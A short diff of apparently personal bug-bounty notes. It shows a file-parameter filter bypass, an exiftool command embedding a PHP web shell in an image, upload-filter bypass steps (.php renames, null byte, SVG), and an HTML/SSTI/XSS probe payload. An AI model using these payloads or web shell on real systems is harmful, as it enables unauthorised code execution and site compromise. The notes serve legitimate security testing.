@@ -1072,6 +1072,11 @@ https://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Ph
 /?file=xx.php    <- Blocked
 /?file===xx.php  <- Bypassed
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg 
+
+31- 1- found a subdomain and create acc&login 
+	2- profile image extention's limited to jpg,png,jpeg
+	3- in upload image Request i changed file type test.jpg to test.php&test.php%00.jpg,... not bypassed
+	4- changed to test.svg and work
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
 HTML INJECTION
 1- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
